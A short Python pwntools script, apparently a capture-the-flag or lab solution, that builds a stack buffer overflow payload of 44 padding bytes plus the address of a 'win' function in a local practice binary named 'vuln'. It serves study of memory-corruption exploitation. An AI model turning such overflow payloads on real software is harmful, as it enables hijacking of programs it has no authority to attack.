#!/usr/bin/env python3

import sys
from pwn import *

vuln = ELF("./vuln", checksec=False)
addr = p32(vuln.symbols["win"])

b = b'A'*44
b += addr
b += b'\n'

# Writing to file works, just not needed, can pipe to 'vuln'
# with open('pyhex.out', 'wb') as fh:
#     fh.write(b)

sys.stdout.buffer.write(b)